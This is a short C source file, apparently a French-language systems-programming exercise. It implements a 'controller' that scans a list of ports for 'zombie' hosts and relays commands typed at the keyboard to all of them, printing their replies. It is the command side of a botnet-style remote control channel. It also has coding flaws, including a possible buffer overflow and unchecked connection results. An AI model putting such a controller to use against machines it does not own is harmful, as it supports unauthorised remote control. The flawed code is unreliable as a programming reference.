#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#include "messages.h"
#include "utils_v2.h"


volatile sig_atomic_t end = 0;

void endControllerHandler(int sig)
{
  end = 1;
}


/**
 * Returns sockfd or a negative number if there was an error creating the connection.
 */
int initSocketClient(char * serverIP, int serverPort)
{
  int sockfd = ssocket();
  struct sockaddr_in addr;
  memset(&addr,0,sizeof(addr)); /* en System V */
  addr.sin_family = AF_INET;
  addr.sin_port = htons(serverPort);
  inet_aton(serverIP,&addr.sin_addr);
  int ret = connect(sockfd, (struct sockaddr *) &addr, sizeof(addr));
  if(ret < 0) return ret;
  return sockfd;
}


int main(int argc, char **argv)
{
  int nbConnexions = argc-1;

  int possiblePorts[10] = {SERVER_PORT_1, SERVER_PORT_2, SERVER_PORT_3, SERVER_PORT_4, 
        SERVER_PORT_5, SERVER_PORT_6, SERVER_PORT_7, SERVER_PORT_8,
        SERVER_PORT_9, SERVER_PORT_10};

  int port;

  int *sockfds = (int*) malloc(sizeof(int)*nbConnexions);

  // Essai de tous les ports possibles
  for(int i = 0; i < 10; i++){
      port = possiblePorts[i];
      sockfds[0] = initSocketClient(argv[1], port);
      if (sockfds[0] > 0) {
        printf("Zombie trouvé sur le port %d \n\n", port);
        break;
      }
  }
  
  for (int i = 1; i < nbConnexions; i++) {
      sockfds[i] = initSocketClient(argv[i+1], port);
      printf("Zombie trouvé sur le port %d \n\n", port);
    }


  // armement du signal SIGINT (ctrl-c)
  ssigaction(SIGINT, endControllerHandler);


  int nbChar;
  int bufferRd[256];

  printf("Entrez une commande à envoyer au(x) zombie(s) :\n");

  while ((nbChar = read(0, bufferRd, 256)) > 0 && !end) {
    
    bufferRd[nbChar]='\0';

    for (int i = 0; i < nbConnexions; i++) {

      swrite(sockfds[i], bufferRd, nbChar);
    

      char buf[1024];
      ssize_t n;
      n = read(sockfds[i], buf, sizeof(buf));
      
      nwrite(1, buf, n);
    

      printf("Entrez une commande à envoyer au(x) zombie(s) :\n");
    }
  }

  
  printf("Fin du controlleur\n");



  for (int i=0; i< nbConnexions; i++) {
    sclose(sockfds[i]);
  }

  free(sockfds);
  
  return 0;
}
